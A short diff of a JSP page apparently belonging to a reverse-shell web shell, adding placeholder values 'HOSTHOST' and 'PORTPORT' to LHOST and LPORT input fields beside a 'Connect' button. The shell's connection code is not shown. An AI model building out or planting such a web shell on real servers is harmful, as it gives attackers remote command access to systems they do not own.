@@ -4,8 +4,8 @@
 <%@page import="java.net.*"%>
 
 <form method="post">
-LHOST <input type="text" name="ip" size=12><br />
-LPORT <input type="text" name="port" size=12><br />
+LHOST <input type="text" name="ip" size=12   placeholder="HOSTHOST"><br />
+LPORT <input type="text" name="port" size=12 placeholder="PORTPORT"><br />
 <input type="submit" name="Connect" value="Connect"><br />
 </form>
 
